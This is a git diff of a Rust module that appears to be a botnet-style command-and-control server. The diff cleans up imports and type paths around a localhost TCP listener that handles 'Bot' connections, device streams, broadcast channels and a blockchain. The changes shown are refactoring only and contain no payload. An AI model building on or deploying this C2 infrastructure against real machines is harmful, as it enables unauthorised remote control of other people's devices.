@@ -1,48 +1,36 @@
-extern crate core;
 use tokio::{
+    net,
     io::{AsyncReadExt, AsyncWriteExt, BufReader, Interest, ReadBuf},
-    macros::support::poll_fn,
     sync::{
         broadcast,
         broadcast::Receiver,
-        broadcast::Sender
+        broadcast::Sender,
+        broadcast::error::TryRecvError
     },
-    net::tcp::OwnedWriteHalf,
-    sync::broadcast::error::TryRecvError
 };
 use std::{
     io,
-    slice,
-    net::SocketAddr,
-    process::Command,
-    str::{from_utf8},
     thread,
-    net,
-    future,
+    net::SocketAddr,
+    str::from_utf8,
     error::Error,
-    sync::mpsc,
-    future::Future,
-};
-use std::ops::{Deref, DerefMut};
-use serde::{Deserialize, Serialize};
-use rmp_serde::{Deserializer, Serializer};
-use base32;
-use std::sync::{Arc, Mutex};
-use crate::{
-    encoder,
-    encryption as enc,
-    message as msg,
-    communication::{
-        c2::{Bot, Device_stream},
-        lib
-    },
-    blockchain::{
-        blockchain,
-        block::{Block, BlockData, BlockHeader, Genesis},
-        blockchain::Blockchain
+    sync::{
+        mpsc,
+        Arc,
+        Mutex
     }
 };
-use super::c2;
+use super::{
+    lib,
+    c2
+};
+use crate::{
+    message as msg,
+    blockchain::{
+        block::{Block, BlockData, BlockHeader, Genesis},
+        blockchain::Blockchain,
+    }
+};
 
 const HQ: &str = "127.0.0.1:6969";
 const LOCAL: &str = "127.0.0.1:6000";
@@ -50,7 +38,7 @@ const MSG_SIZE: usize = 4096;
 const USERNAME_LENGTH: usize = 10;
 const IV_LEN: usize = 16;
 
-async fn handle_message_received(DS: &mut c2::Device_stream, socket: &tokio::net::TcpStream) -> Vec<u8> {
+async fn handle_message_received(DS: &mut c2::Device_stream, socket: &net::TcpStream) -> Vec<u8> {
     let mut buffer = [0; MSG_SIZE];
     loop {
         socket.readable().await;
@@ -76,13 +64,13 @@ async fn handle_message_received(DS: &mut c2::Device_stream, socket: &tokio::net
     };
 }
 
-async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr) -> Device_stream {
-    let mut DS = Device_stream::new(
+async fn authenticate_new_user(socket: &net::TcpStream, addr: SocketAddr) -> c2::Device_stream {
+    let mut DS = c2::Device_stream::new(
         addr.to_string(),
         false,
         true,
         Vec::new(),
-        Bot::new(Vec::new(), Vec::new())
+        c2::Bot::new(Vec::new(), Vec::new())
     );
     let data = handle_message_received(&mut DS, socket).await;
     if DS.connected {
@@ -99,7 +87,7 @@ async fn handle_message_from_client(
     mut DS: c2::Device_stream,
     mut bot_tx: Sender<c2::Device_stream>,
     mut c2_rx: Receiver<Vec<u8>>,
-    mut socket: tokio::net::TcpStream,
+    mut socket: net::TcpStream,
 ) -> io::Result<()> {
 
     let mut buffer: [u8; 4096] = [0; MSG_SIZE];
@@ -193,7 +181,7 @@ async fn receive_bot_data(
 #[tokio::main]
 pub async fn main() -> Result<(), Box<dyn Error>> {
 
-    let listener = tokio::net::TcpListener::bind(LOCAL).await?;
+    let listener = net::TcpListener::bind(LOCAL).await?;
     let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
     let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
 
@@ -205,7 +193,7 @@ pub async fn main() -> Result<(), Box<dyn Error>> {
     let mut Co: c2::Cohort = c2::Cohort::new();
 
     let mut Blk: Block = Block::genesis_block();
-    let mut Blkchain: blockchain::Blockchain = blockchain::Blockchain::new(Blk.clone());
+    let mut Blkchain: Blockchain = Blockchain::new(Blk.clone());
 
     let Blkchain_arc = Arc::new(Mutex::new(Blkchain));
     let Blk_arc = Arc::new(Mutex::new(Blk));
